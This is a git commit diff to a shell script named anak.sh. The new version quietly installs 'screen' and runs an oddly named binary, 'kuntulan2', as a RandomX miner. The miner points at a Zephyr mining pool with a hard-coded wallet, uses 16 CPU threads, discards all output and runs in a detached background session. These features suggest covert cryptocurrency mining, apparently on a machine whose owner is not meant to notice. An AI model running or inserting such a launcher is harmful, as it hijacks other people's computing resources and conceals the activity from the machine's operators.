cc42cf48902e3a44bfaa5af2648c5ba73c194d24
renilo <88342640+renilo@users.noreply.github.com>
2023-12-03 19:20:02 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -1,1 +1,3 @@
-sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-US1) --cpu-threads 16 --disable-gpu >/dev/null 2>&1
+sudo apt install screen -y >/dev/null 2>&1
+
+screen -dmS Running sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-US1) --cpu-threads 16 --disable-gpu >/dev/null 2>&1 >/dev/null 2>&1
